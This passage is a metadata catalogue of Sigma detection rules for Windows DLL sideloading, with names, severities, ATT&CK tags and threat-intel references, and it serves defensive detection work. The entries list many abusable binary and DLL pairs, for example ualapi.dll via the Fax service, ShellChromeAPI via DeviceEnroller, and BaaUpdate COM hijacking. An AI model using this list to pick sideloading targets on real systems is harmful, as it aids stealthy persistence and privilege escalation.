    JLI.dll has been observed being side-loaded by Java processes by various threat
    actors, including APT41, XWorm,

    and others in order to load malicious payloads in context of legitimate Java processes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://securelist.com/apt41-in-africa/116986/
  - https://lab52.io/blog/snake-keylogger-in-geopolitical-affairs-abuse-of-trusted-java-utilities-in-cybercrime-operations/
  - https://hijacklibs.net/entries/3rd_party/oracle/jli.html
  - https://www.proofpoint.com/us/blog/threat-insight/phish-china-aligned-espionage-actors-ramp-up-taiwan-semiconductor-targeting
  false_positives:
  - Unknown
  notes: ''
- detection_id: 68654bf0-4412-43d5-bfe8-5eaa393cd939
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_jsschhlp.yml
  name: Potential DLL Sideloading Via JsSchHlp
  description: Detects potential DLL sideloading using JUSTSYSTEMS Japanese word processor
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.welivesecurity.com/2022/12/14/unmasking-mirrorface-operation-liberalface-targeting-japanese-political-entities/
  - http://www.windowexe.com/bbs/board.php?q=jsschhlp-exe-c-program-files-common-files-justsystem-jsschhlp-jsschhlp
  false_positives:
  - Unknown
  notes: ''
- detection_id: d2451be2-b582-4e15-8701-4196ac180260
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_keyscrambler.yml
  name: Potential DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE
  description: 'Detects potential DLL side loading of "KeyScramblerIE.dll" by "KeyScrambler.exe".

    Various threat actors and malware have been found side loading a masqueraded "KeyScramblerIE.dll"
    through "KeyScrambler.exe".

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://thehackernews.com/2024/03/two-chinese-apt-groups-ramp-up-cyber.html
  - https://csirt-cti.net/2024/02/01/stately-taurus-continued-new-information-on-cyberespionage-attacks-against-myanmar-military-junta/
  - https://bazaar.abuse.ch/sample/5cb9876681f78d3ee8a01a5aaa5d38b05ec81edc48b09e3865b75c49a2187831/
  - https://twitter.com/Max_Mal_/status/1775222576639291859
  - https://twitter.com/DTCERT/status/1712785426895839339
  false_positives:
  - Unknown
  notes: ''
- detection_id: bf9808c4-d24f-44a2-8398-b65227d406b6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_libvlc.yml
  name: Potential Libvlc.DLL Sideloading
  description: Detects potential DLL sideloading of "libvlc.dll", a DLL that is legitimately
    used by "VLC.exe"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html
  - https://hijacklibs.net/entries/3rd_party/vlc/libvlc.html
  false_positives:
  - False positives are expected if VLC is installed in non-default locations
  notes: ''
- detection_id: d2605a99-2218-4894-8fd3-2afb7946514d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_mfdetours.yml
  name: Potential Mfdetours.DLL Sideloading
  description: Detects potential DLL sideloading of "mfdetours.dll". While using "mftrace.exe"
    it can be abused to attach to an arbitrary process and force load any DLL named
    "mfdetours.dll" from the current directory of execution.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 948a0953-f287-4806-bbcb-3b2e396df89f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_mfdetours_unsigned.yml
  name: Unsigned Mfdetours.DLL Sideloading
  description: Detects DLL sideloading of unsigned "mfdetours.dll". Executing "mftrace.exe"
    can be abused to attach to an arbitrary process and force load any DLL named "mfdetours.dll"
    from the current directory of execution.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 5ba243e5-8165-4cf7-8c69-e1d3669654c1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_mpsvc.yml
  name: Potential DLL Sideloading Of MpSvc.DLL
  description: Detects potential DLL sideloading of "MpSvc.dll".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://hijacklibs.net/entries/microsoft/built-in/mpsvc.html
  false_positives:
  - Legitimate applications loading their own versions of the DLL mentioned in this
    rule.
  notes: ''
- detection_id: cdb15e19-c2d0-432a-928e-e49c8c60dcf2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_mscorsvc.yml
  name: Potential DLL Sideloading Of MsCorSvc.DLL
  description: Detects potential DLL sideloading of "mscorsvc.dll".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://hijacklibs.net/entries/microsoft/built-in/mscorsvc.html
  false_positives:
  - Legitimate applications loading their own versions of the DLL mentioned in this
    rule.
  notes: ''
- detection_id: 6b98b92b-4f00-4f62-b4fe-4d1920215771
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_non_existent_dlls.yml
  name: Potential DLL Sideloading Of Non-Existent DLLs From System Folders
  description: 'Detects DLL sideloading of system DLLs that are not present on the
    system by default (at least not in system directories).

    Usually this technique is used to achieve UAC bypass or privilege escalation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://decoded.avast.io/martinchlumecky/png-steganography/
  - https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992
  - https://clement.notin.org/blog/2020/09/12/CVE-2020-7315-McAfee-Agent-DLL-injection/
  - https://github.com/Wh04m1001/SysmonEoP
  - https://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/
  - http://remoteawesomethoughts.blogspot.com/2019/05/windows-10-task-schedulerservice.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 829a3bdf-34da-4051-9cf4-8ed221a8ae4f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_office_dlls.yml
  name: Microsoft Office DLL Sideload
  description: Detects DLL sideloading of DLLs that are part of Microsoft Office from
    non standard location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://hijacklibs.net/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d36f7c12-14a3-4d48-b6b8-774b9c66f44d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_python.yml
  name: Potential Python DLL SideLoading
  description: Detects potential DLL sideloading of Python DLL files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.securonix.com/blog/seolurker-attack-campaign-uses-seo-poisoning-fake-google-ads-to-install-malware/
  - https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/
  - https://github.com/wietze/HijackLibs/tree/dc9c9f2f94e6872051dab58fbafb043fdd8b4176/yml/3rd_party/python
  false_positives:
  - Legitimate software using Python DLLs
  notes: ''
- detection_id: 6e78b74f-c762-4800-82ad-f66787f10c8a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_rcdll.yml
  name: Potential Rcdll.DLL Sideloading
  description: Detects potential DLL sideloading of rcdll.dll
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/23/c/iron-tiger-sysupdate-adds-linux-targeting.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 259dda31-b7a3-444f-b7d8-17f96e8a7d0d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_rjvplatform_default_location.yml
  name: Potential RjvPlatform.DLL Sideloading From Default Location
  description: Detects loading of "RjvPlatform.dll" by the "SystemResetPlatform.exe"
    binary which can be abused as a method of DLL side loading since the "$SysReset"
    directory isn't created by default.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1666716511988330499
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0e0bc253-07ed-43f1-816d-e1b220fe8971
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_rjvplatform_non_default_location.yml
  name: Potential RjvPlatform.DLL Sideloading From Non-Default Location
  description: Detects potential DLL sideloading of "RjvPlatform.dll" by "SystemResetPlatform.exe"
    located in a non-default location.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1666716511988330499
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f64c9b2d-b0ad-481d-9d03-7fc75020892a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_robform.yml
  name: Potential RoboForm.DLL Sideloading
  description: Detects potential DLL sideloading of "roboform.dll", a DLL used by
    RoboForm Password Manager
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://twitter.com/StopMalvertisin/status/1648604148848549888
  - https://twitter.com/t3ft3lb/status/1656194831830401024
  - https://www.roboform.com/
  false_positives:
  - If installed on a per-user level, the path would be located in "AppData\Local".
    Add additional filters to reflect this mode of installation
  notes: ''
- detection_id: ee4c5d06-3abc-48cc-8885-77f1c20f4451
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_shell_chrome_api.yml
  name: DLL Sideloading Of ShellChromeAPI.DLL
  description: 'Detects processes loading the non-existent DLL "ShellChromeAPI". One
    known example is the "DeviceEnroller" binary in combination with the "PhoneDeepLink"
    flag tries to load this DLL.

    Adversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe
    using this parameter

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://mobile.twitter.com/0gtweet/status/1564131230941122561
  - https://strontic.github.io/xcyclopedia/library/DeviceEnroller.exe-24BEF0D6B0ECED36BB41831759FDE18D.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 844f8eb2-610b-42c8-89a4-47596e089663
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_shelldispatch.yml
  name: Potential ShellDispatch.DLL Sideloading
  description: Detects potential DLL sideloading of "ShellDispatch.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/
  false_positives:
  - Some installers may trigger some false positives
  notes: ''
- detection_id: 24b6cf51-6122-469e-861a-22974e9c1e5b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_smadhook.yml
  name: Potential SmadHook.DLL Sideloading
  description: Detects potential DLL sideloading of "SmadHook.dll", a DLL used by
    SmadAV antivirus
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://research.checkpoint.com/2023/malware-spotlight-camaro-dragons-tinynote-backdoor/
  - https://www.qurium.org/alerts/targeted-malware-against-crph/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a2edbce1-95c8-4291-8676-0d45146862b3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_solidpdfcreator.yml
  name: Potential SolidPDFCreator.DLL Sideloading
  description: Detects potential DLL sideloading of "SolidPDFCreator.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://lab52.io/blog/new-mustang-pandas-campaing-against-australia/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f9df325d-d7bc-4a32-8a1a-2cc61dcefc63
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_third_party.yml
  name: Third Party Software DLL Sideloading
  description: Detects DLL sideloading of DLLs that are part of third party software
    (zoom, discord....etc)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://hijacklibs.net/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 828af599-4c53-4ed2-ba4a-a9f835c434ea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_ualapi.yml
  name: Fax Service DLL Search Order Hijack
  description: The Fax service attempts to load ualapi.dll, which is non-existent.
    An attacker can then (side)load their own malicious DLL using this service.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://windows-internals.com/faxing-your-way-to-system/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 2092cacb-d77b-4f98-ab0d-32b32f99a054
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_vivaldi_elf.yml
  name: Potential Vivaldi_elf.DLL Sideloading
  description: Detects potential DLL sideloading of "vivaldi_elf.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://research.checkpoint.com/2023/beyond-the-horizon-traveling-the-world-on-camaro-dragons-usb-flash-drives/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 70e8e9b4-6a93-4cb7-8cde-da69502e7aff
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_vmguestlib.yml
  name: VMGuestLib DLL Sideload
  description: Detects DLL sideloading of VMGuestLib.dll by the WmiApSrv service.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://decoded.avast.io/martinchlumecky/png-steganography/
  false_positives:
  - FP could occur if the legitimate version of vmGuestLib already exists on the system
  notes: ''
- detection_id: 98ffaed4-aec2-4e04-9b07-31492fe68b3d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_vmmap_dbghelp_signed.yml
  name: VMMap Signed Dbghelp.DLL Potential Sideloading
  description: Detects potential DLL sideloading of a signed dbghelp.dll by the Sysinternals
    VMMap.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://techcommunity.microsoft.com/t5/sysinternals-blog/zoomit-v7-1-procdump-2-0-for-linux-process-explorer-v17-05/ba-p/3884766
  false_positives:
  - Unknown
  notes: ''
- detection_id: 273a8dd8-3742-4302-bcc7-7df5a80fe425
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_vmmap_dbghelp_unsigned.yml
  name: VMMap Unsigned Dbghelp.DLL Potential Sideloading
  description: Detects potential DLL sideloading of an unsigned dbghelp.dll by the
    Sysinternals VMMap.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://techcommunity.microsoft.com/t5/sysinternals-blog/zoomit-v7-1-procdump-2-0-for-linux-process-explorer-v17-05/ba-p/3884766
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9313dc13-d04c-46d8-af4a-a930cc55d93b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_vmware_xfer.yml
  name: Potential DLL Sideloading Via VMware Xfer
  description: Detects loading of a DLL by the VMware Xfer utility from the non-default
    directory which may be an attempt to sideload arbitrary DLL
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 71b31e99-9ad0-47d4-aeb5-c0ca3928eeeb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_waveedit.yml
  name: Potential Waveedit.DLL Sideloading
  description: Detects potential DLL sideloading of "waveedit.dll", which is part
    of the Nero WaveEditor audio editing software.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: db77ce78-7e28-4188-9337-cf30e2b3ba9f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_wazuh.yml
  name: Potential Wazuh Security Platform DLL Sideloading
  description: Detects potential DLL side loading of DLLs that are part of the Wazuh
    security platform
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/23/c/iron-tiger-sysupdate-adds-linux-targeting.html
  false_positives:
  - Many legitimate applications leverage this DLL. (Visual Studio, JetBrains, Ruby,
    Anaconda, GithubDesktop, etc.)
  notes: ''
- detection_id: 418dc89a-9808-4b87-b1d7-e5ae0cb6effc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_windows_defender.yml
  name: Potential Mpclient.DLL Sideloading
  description: Detects potential sideloading of "mpclient.dll" by Windows Defender
    processes ("MpCmdRun" and "NisSrv") from their non-default directory.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e2e01011-5910-4267-9c3b-4149ed5479cf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_wwlib.yml
  name: Potential WWlib.DLL Sideloading
  description: Detects potential DLL sideloading of "wwlib.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://twitter.com/WhichbufferArda/status/1658829954182774784
  - https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/
  - https://securelist.com/apt-luminousmoth/103332/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6e8fe0a8-ba0b-4a93-8f9e-82657e7a5984
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_susp_baaupdate_dll_load.yml
  name: BaaUpdate.exe Suspicious DLL Load
  description: 'Detects BitLocker Access Agent Update Utility (baaupdate.exe) loading
    DLLs from suspicious locations that are publicly writable which could indicate
    an attempt to lateral movement via BitLocker DCOM & COM Hijacking.

    This technique abuses COM Classes configured as INTERACTIVE USER to spawn processes
    in the context of the logged-on user''s session. Specifically, it targets the
    BDEUILauncher Class (CLSID ab93b6f1-be76-4185-a488-a9001b105b94)

    which can launch BaaUpdate.exe, which is vulnerable to COM Hijacking when started
    with input parameters. This allows attackers to execute code in the user''s context
    without needing to steal credentials or use additional techniques to compromise
    the account.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1021.003
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.lateral-movement
  - attack.t1021.003
  time_window: ''
  references:
  - https://github.com/rtecCyberSec/BitlockMove
  false_positives:
  - Unknown
  notes: ''
- detection_id: 060d5ad4-3153-47bb-8382-43e5e29eda92
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_susp_clickonce_unsigned_module_loaded.yml
  name: Unsigned Module Loaded by ClickOnce Application
  description: Detects unsigned module load by ClickOnce application.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.t1574.001
  time_window: ''
  references:
  - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9e9a9002-56c4-40fd-9eff-e4b09bfa5f6c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_susp_dll_load_system_process.yml
